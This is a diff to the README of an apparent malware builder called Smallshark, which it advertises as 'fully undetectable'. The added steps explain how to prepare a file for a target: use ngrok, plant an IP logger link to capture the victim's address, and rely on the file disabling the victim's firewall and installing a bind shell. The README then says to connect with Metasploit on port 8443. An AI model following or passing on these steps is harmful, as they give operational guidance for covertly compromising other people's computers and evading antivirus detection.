@@ -12,6 +12,14 @@
 - FUD (Fully undetectable)
 - Builder script both works with Windows and Linux
 
+### Before sending file to target :
+- 1 Run python3 Smallshark.py
+- 2 Enter ip address you got from ngrok tool
+- 3 Open ngrok tool and listen loopback interface from tcpdump
+- 4 Add IP Logger link to ensure obtaining IP address of the target 
+
+### Running this file will disable target's firewall and add bind shell to target's PC
+
 ### After target opens the file : 
 - 1 Open Metasploit or it's equivalent
 - 2 Choose bind shell 
@@ -19,7 +27,8 @@
 - 4 Enter 8443 as RPORT
 - 5 Exploit
 
-![1](https://github.com/Nemesis0U/Smallshark/assets/83503290/c38b761c-dd13-4298-b0cd-7148949bbb67)
+![screenshot](https://github.com/Nemesis0U/Smallshark/assets/83503290/e4523575-8a98-4c6d-b44d-60a302126273)
+
 
 
 New Results(2023, No longer FUD):
